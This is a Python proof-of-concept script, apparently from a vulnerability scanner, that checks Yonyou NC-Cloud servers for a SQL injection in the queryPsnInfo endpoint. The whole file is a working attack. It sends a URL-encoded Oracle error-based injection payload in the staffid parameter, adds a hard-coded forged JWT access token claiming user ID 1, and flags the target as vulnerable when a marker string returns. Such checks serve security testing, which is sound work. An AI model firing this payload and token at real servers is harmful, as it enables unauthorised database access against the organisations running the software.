import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友NC-Cloud系统queryPsnInfo存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1',
        'Accesstokenncc': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "/ncchr/pm/obj/queryPsnInfo?staffid=1%27+AND+1754%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%281754%3D1754%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29--+Nzkh")
    try:
        response = requests.get(vurl, headers=headers)
        if 'qjzvq' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult